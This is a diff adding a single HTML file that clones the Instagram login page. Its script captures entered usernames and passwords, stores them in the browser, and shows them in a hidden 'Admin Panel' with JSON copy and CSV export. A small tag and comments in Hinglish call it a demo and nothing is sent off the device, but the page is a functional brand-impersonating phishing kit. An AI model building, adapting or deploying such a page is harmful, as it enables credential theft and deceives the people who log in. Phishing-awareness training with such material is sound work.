@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Instagram</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --border:#dbdbdb; --muted:#8e8e8e; --blue:#0095f6;
+    --ink:#262626; --link:#00376b; --bg:#fafafa;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--ink); min-height:100vh;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    padding:24px 16px 48px;
+  }
+  .wrap{width:100%; max-width:350px;}
+
+  .card{background:#fff; border:1px solid var(--border); border-radius:1px; padding:44px 40px 22px; text-align:center;}
+  .logo{
+    font-family:'Grand Hotel','Segoe Script','Brush Script MT',cursive;
+    font-size:44px; line-height:1; margin:6px 0 30px; letter-spacing:-1px; user-select:none;
+  }
+  .field{position:relative; margin-bottom:6px;}
+  .field input{
+    width:100%; padding:10px 8px; font-size:13px;
+    background:#fafafa; border:1px solid var(--border); border-radius:3px; outline:none;
+  }
+  .field input:focus{border-color:#a8a8a8; background:#fff;}
+  .field input::placeholder{color:#8e8e8e;}
+  .togglepw{
+    position:absolute; right:8px; top:50%; transform:translateY(-50%);
+    font-size:13px; font-weight:600; cursor:pointer; background:none; border:none; display:none;
+  }
+  .field.has-value .togglepw{display:block;}
+
+  .btn{
+    width:100%; margin-top:8px; padding:8px 16px; border:none; border-radius:8px;
+    background:var(--blue); color:#fff; font-size:14px; font-weight:600; cursor:pointer;
+  }
+  .btn:hover{background:#1877f2;}
+  .btn:disabled{opacity:.6; cursor:default;}
+
+  .divider{display:flex; align-items:center; gap:18px; margin:20px 0 18px;}
+  .divider .line{flex:1; height:1px; background:var(--border);}
+  .divider span{font-size:13px; font-weight:600; color:var(--muted);}
+
+  .fb{display:flex; align-items:center; justify-content:center; gap:8px; color:#385185; font-size:14px; font-weight:600; cursor:pointer;}
+  .forgot{display:inline-block; margin-top:20px; font-size:12px; color:var(--link); text-decoration:none;}
+
+  .signup{background:#fff; border:1px solid var(--border); margin-top:10px; padding:22px; text-align:center; font-size:14px;}
+  .signup a{color:var(--blue); font-weight:600; text-decoration:none;}
+  .getapp{text-align:center; margin-top:20px; font-size:14px;}
+  .badges{display:flex; gap:8px; justify-content:center; margin-top:12px;}
+  .badge{border:1px solid var(--ink); border-radius:6px; padding:5px 10px; font-size:11px; font-weight:600; line-height:1.2;}
+  .badge small{display:block; font-size:8px; font-weight:400; opacity:.75;}
+
+  .toast{
+    position:fixed; left:50%; bottom:28px; transform:translate(-50%,140%);
+    background:#262626; color:#fff; font-size:13px; font-weight:600;
+    padding:11px 18px; border-radius:10px; z-index:99; transition:transform .28s ease;
+  }
+  .toast.show{transform:translate(-50%,0);}
+
+  .adminBtn{
+    position:fixed; top:16px; right:16px; z-index:60;
+    background:#262626; color:#fff; border:none; cursor:pointer;
+    padding:9px 15px; border-radius:999px; font-size:13px; font-weight:600;
+    display:flex; align-items:center; gap:7px;
+  }
+  .adminBtn .pill{
+    background:#ff3040; border-radius:999px; font-size:11px;
+    min-width:19px; height:19px; padding:0 5px;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .demoTag{
+    position:fixed; left:16px; bottom:16px; z-index:60; font-size:11px;
+    background:#fff; border:1px solid var(--border); color:var(--muted);
+    padding:5px 10px; border-radius:999px;
+  }
+
+  .backdrop{position:fixed; inset:0; background:rgba(0,0,0,.35); opacity:0; pointer-events:none; transition:opacity .25s; z-index:70;}
+  .backdrop.show{opacity:1; pointer-events:auto;}
+
+  .panel{
+    position:fixed; top:0; right:0; height:100%; width:460px; max-width:100%;
+    background:#fff; z-index:80; transform:translateX(102%);
+    transition:transform .3s cubic-bezier(.4,0,.2,1);
+    display:flex; flex-direction:column;
+  }
+  .panel.open{transform:translateX(0);}
+
+  .panelHead{padding:14px 16px; border-bottom:1px solid #efefef; display:flex; align-items:center; justify-content:space-between; gap:10px;}
+  .panelHead h2{margin:0; font-size:15px; font-weight:700;}
+  .panelHead .sub{font-size:11px; color:var(--muted); margin-top:3px;}
+  .closeX{background:#fafafa; border:1px solid var(--border); border-radius:8px; width:30px; height:30px; font-size:16px; cursor:pointer;}
+
+  .panelBar{display:flex; align-items:center; gap:8px; flex-wrap:wrap; padding:10px 16px; border-bottom:1px solid #efefef; background:#fafafa;}
+  .mini{border:1px solid var(--border); background:#fff; border-radius:8px; padding:6px 11px; font-size:12px; font-weight:600; cursor:pointer;}
+  .mini:hover{background:#f0f0f0;}
+  .mini.danger{color:#ed4956;}
+  .switch{margin-left:auto; font-size:11px; color:var(--muted); display:flex; align-items:center; gap:6px; cursor:pointer;}
+
+  /* ---------- LATEST CAPTURE CARD ---------- */
+  .latest{
+    margin:14px 16px 0; border:1px solid #cfe9ff; background:#f2f9ff;
+    border-radius:12px; padding:12px 14px;
+  }
+  .latest .t{font-size:10.5px; text-transform:uppercase; letter-spacing:.5px; color:#0a7bc0; font-weight:700;}
+  .latest .row{display:flex; gap:10px; margin-top:8px; font-size:13px;}
+  .latest .k{width:74px; color:#5a7a90; flex:none;}
+  .latest .v{font-weight:700; overflow-wrap:anywhere; word-break:break-word;}
+  .latest .none{font-size:12.5px; color:#5a7a90; margin-top:6px;}
+
+  /* ---------- TABLE ---------- */
+  .tableWrap{overflow:auto; flex:1; margin-top:12px;}
+  table{width:100%; border-collapse:collapse; table-layout:fixed; font-size:12.5px;}
+  th{
+    position:sticky; top:0; background:#fff; text-align:left; z-index:2;
+    padding:8px 6px; border-bottom:1px solid var(--border);
+    font-size:10px; text-transform:uppercase; letter-spacing:.3px; color:var(--muted);
+  }
+  td{padding:9px 6px; border-bottom:1px solid #f2f2f2; vertical-align:top; overflow-wrap:anywhere; word-break:break-word;}
+  tbody td:first-child{color:var(--muted);}
+  tbody td:nth-child(4){white-space:nowrap; font-size:11.5px; color:#666;}
+  tr.hl{animation:flash 2.4s ease-out;}
+  @keyframes flash{0%{background:#d9f0ff;} 100%{background:transparent;}}
+  .empty td{text-align:center; color:var(--muted); padding:28px 10px; font-size:12.5px;}
+
+  .panelFoot{padding:10px 16px; border-top:1px solid #efefef; font-size:11px; color:var(--muted);}
+  .warn{background:#fff8e1; color:#8a6100; font-size:11.5px; padding:8px 16px; display:none;}
+
+  @media(max-width:430px){
+    .card{padding:34px 24px 18px; border:none; background:transparent;}
+    body{background:#fff;}
+    .signup{background:transparent; border:none; padding-top:10px;}
+    .latest{margin:12px 12px 0;}
+  }
+</style>
+</head>
+<body>
+
+  <button class="adminBtn" id="adminBtn">🕵️ Admin <span class="pill" id="badge">0</span></button>
+  <div class="demoTag">demo • real Instagram nahi hai</div>
+
+  <div class="wrap">
+    <div class="card">
+      <div class="logo">Instagram</div>
+
+      <form id="loginForm" autocomplete="off" novalidate>
+        <div class="field">
+          <input id="user" type="text" placeholder="Phone number, username, or email" autocomplete="off" />
+        </div>
+        <div class="field">
+          <input id="pass" type="password" placeholder="Password" autocomplete="new-password" />
+          <button type="button" class="togglepw" id="togglepw">Show</button>
+        </div>
+        <button class="btn" type="submit" id="loginBtn">Log in</button>
+      </form>
+
+      <div class="divider"><span class="line"></span><span>OR</span><span class="line"></span></div>
+
+      <div class="fb">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
+        Log in with Facebook
+      </div>
+
+      <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
+    </div>
+
+    <div class="signup">Don't have an account? <a href="#" onclick="return false;">Sign up</a></div>
+
+    <div class="getapp">
+      Get the app.
+      <div class="badges">
+        <div class="badge"><small>Download on the</small>App Store</div>
+        <div class="badge"><small>GET IT ON</small>Google Play</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">✅ Captured!</div>
+  <div class="backdrop" id="backdrop"></div>
+
+  <aside class="panel" id="panel">
+    <div class="panelHead">
+      <div>
+        <h2>Admin Panel</h2>
+        <div class="sub">Total captured: <b id="count">0</b></div>
+      </div>
+      <button class="closeX" id="closePanel">✕</button>
+    </div>
+
+    <div class="warn" id="warn">⚠️ localStorage blocked hai — data sirf is tab tak rahega.</div>
+
+    <div class="panelBar">
+      <button class="mini" id="copyBtn">Copy JSON</button>
+      <button class="mini" id="csvBtn">Export CSV</button>
+      <button class="mini danger" id="clearBtn">Clear all</button>
+      <label class="switch"><input type="checkbox" id="autoOpen" checked> auto-open</label>
+    </div>
+
+    <div class="latest" id="latest"></div>
+
+    <div class="tableWrap">
+      <table>
+        <colgroup>
+          <col style="width:30px">
+          <col style="width:34%">
+          <col style="width:30%">
+          <col style="width:36%">
+        </colgroup>
+        <thead>
+          <tr><th>#</th><th>Username</th><th>Password</th><th>Time</th></tr>
+        </thead>
+        <tbody id="rows"></tbody>
+      </table>
+    </div>
+
+    <div class="panelFoot">Shortcut: <b>Ctrl+Shift+A</b> panel kholne ke liye • <b>Esc</b> band karne ke liye</div>
+  </aside>
+
+<script>
+(function () {
+  "use strict";
+
+  var KEY = "ig_phish_capture_v2";
+  var $ = function (id) { return document.getElementById(id); };
+
+  var data = [];
+  var storageOK = true;
+
+  /* ---------- safe storage ---------- */
+  function loadFromStorage() {
+    try {
+      var raw = localStorage.getItem(KEY);
+      data = raw ? (JSON.parse(raw) || []) : [];
+    } catch (e) {
+      storageOK = false;
+      data = [];
+    }
+    if (!Array.isArray(data)) data = [];
+  }
+  function saveToStorage() {
+    try {
+      localStorage.setItem(KEY, JSON.stringify(data));
+    } catch (e) {
+      storageOK = false;
+    }
+  }
+
+  function esc(s) {
+    return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
+      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
+    });
+  }
+  function stamp() {
+    var d = new Date();
+    var p = function (n) { return (n < 10 ? "0" : "") + n; };
+    return p(d.getDate()) + "/" + p(d.getMonth() + 1) + "/" + d.getFullYear() +
+           " " + p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
+  }
+
+  /* ---------- render ---------- */
+  function render(highlightId) {
+    $("badge").textContent = data.length;
+    $("count").textContent = data.length;
+    if (!storageOK) $("warn").style.display = "block";
+
+    /* latest card */
+    var last = data[data.length - 1];
+    $("latest").innerHTML = last
+      ? '<div class="t">Last captured</div>' +
+        '<div class="row"><div class="k">Username</div><div class="v">' + esc(last.u) + '</div></div>' +
+        '<div class="row"><div class="k">Password</div><div class="v">' + esc(last.p) + '</div></div>' +
+        '<div class="row"><div class="k">Time</div><div class="v">' + esc(last.t) + '</div></div>'
+      : '<div class="t">Last captured</div><div class="none">Abhi koi login nahi hua.</div>';
+
+    /* table */
+    var tbody = $("rows");
+    if (!data.length) {
+      tbody.innerHTML = '<tr class="empty"><td colspan="4">Koi entry nahi. Login page pe username &amp; password daal ke "Log in" dabao.</td></tr>';
+      return;
+    }
+    var html = "";
+    for (var i = data.length - 1; i >= 0; i--) {
+      var e = data[i];
+      var n = i + 1;
+      html += "<tr" + (e.id === highlightId ? ' class="hl"' : "") + ">" +
+                "<td>" + n + "</td>" +
+                "<td>" + esc(e.u) + "</td>" +
+                "<td>" + esc(e.p) + "</td>" +
+                "<td>" + esc(e.t) + "</td>" +
+              "</tr>";
+    }
+    tbody.innerHTML = html;
+  }
+
+  /* ---------- panel ---------- */
+  var panel = $("panel"), backdrop = $("backdrop");
+  function openPanel() { panel.classList.add("open"); backdrop.classList.add("show"); }
+  function closePanel() { panel.classList.remove("open"); backdrop.classList.remove("show"); }
+
+  $("adminBtn").addEventListener("click", function () {
+    if (panel.classList.contains("open")) closePanel(); else openPanel();
+  });
+  $("closePanel").addEventListener("click", closePanel);
+  backdrop.addEventListener("click", closePanel);
+
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape") closePanel();
+    if (e.ctrlKey && e.shiftKey && (e.key === "A" || e.key === "a")) {
+      e.preventDefault(); openPanel();
+    }
+  });
+
+  /* ---------- password toggle ---------- */
+  var passInput = $("pass");
+  $("togglepw").addEventListener("click", function () {
+    var show = passInput.type === "password";
+    passInput.type = show ? "text" : "password";
+    this.textContent = show ? "Hide" : "Show";
+  });
+  ["user", "pass"].forEach(function (id) {
+    $(id).addEventListener("input", function () {
+      this.parentElement.classList.toggle("has-value", this.value.length > 0);
+    });
+  });
+
+  /* ---------- toast ---------- */
+  var toastTimer;
+  function toast(msg) {
+    var t = $("toast");
+    t.textContent = msg;
+    t.classList.add("show");
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { t.classList.remove("show"); }, 2600);
+  }
+
+  /* ---------- capture ---------- */
+  $("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    var u = $("user").value.trim();
+    var p = $("pass").value;
+
+    if (!u && !p) { toast("Username aur password daalo"); return; }
+    if (!u) { toast("Username daalo"); return; }
+    if (!p) { toast("Password daalo"); return; }
+
+    var entry = {
+      id: String(Date.now()) + Math.random().toString(36).slice(2, 7),
+      u: u,
+      p: p,
+      t: stamp()
+    };
+
+    data.push(entry);
+    saveToStorage();
+    render(entry.id);          // panel pehle update karo
+
+    $("loginBtn").textContent = "Logging in…";
+    $("loginBtn").disabled = true;
+
+    setTimeout(function () {
+      $("loginBtn").textContent = "Log in";
+      $("loginBtn").disabled = false;
+
+      $("user").value = "";
+      $("pass").value = "";
+      $("pass").type = "password";
+      $("togglepw").textContent = "Show";
+      var fields = document.querySelectorAll(".field");
+      for (var i = 0; i < fields.length; i++) fields[i].classList.remove("has-value");
+
+      toast("✅ Captured: " + u);
+      if ($("autoOpen").checked) openPanel();
+    }, 700);
+  });
+
+  /* ---------- copy / csv / clear ---------- */
+  $("copyBtn").addEventListener("click", function () {
+    var txt = JSON.stringify(data, null, 2);
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(
+        function () { toast("📋 JSON copy ho gaya"); },
+        function () { fallbackCopy(txt); }
+      );
+    } else { fallbackCopy(txt); }
+  });
+  function fallbackCopy(txt) {
+    var ta = document.createElement("textarea");
+    ta.value = txt; document.body.appendChild(ta); ta.select();
+    try { document.execCommand("copy"); toast("📋 Copy ho gaya"); }
+    catch (e) { toast("Copy fail — manually select karo"); }
+    ta.remove();
+  }
+
+  $("csvBtn").addEventListener("click", function () {
+    if (!data.length) { toast("Data khaali hai"); return; }
+    var rows = [["#", "Username", "Password", "Time"]];
+    data.forEach(function (e, i) { rows.push([i + 1, e.u, e.p, e.t]); });
+    var csv = rows.map(function (r) {
+      return r.map(function (c) { return '"' + String(c).replace(/"/g, '""') + '"'; }).join(",");
+    }).join("\n");
+
+    var blob = new Blob(["\ufeff" + csv], { type: "text/csv;charset=utf-8;" });
+    var a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "captured_logins.csv";
+    a.click();
+    URL.revokeObjectURL(a.href);
+    toast("⬇️ CSV download");
+  });
+
+  $("clearBtn").addEventListener("click", function () {
+    if (!data.length) return;
+    if (!confirm("Saara data delete kar dein?")) return;
+    data = [];
+    saveToStorage();
+    render();
+    toast("🗑️ Clear ho gaya");
+  });
+
+  /* ---------- boot ---------- */
+  loadFromStorage();
+  render();
+  if (location.hash === "#admin") openPanel();
+
+  window.__igData = function () { return data; };  // debug: console me __igData()
+})();
+</script>
+</body>
+</html>
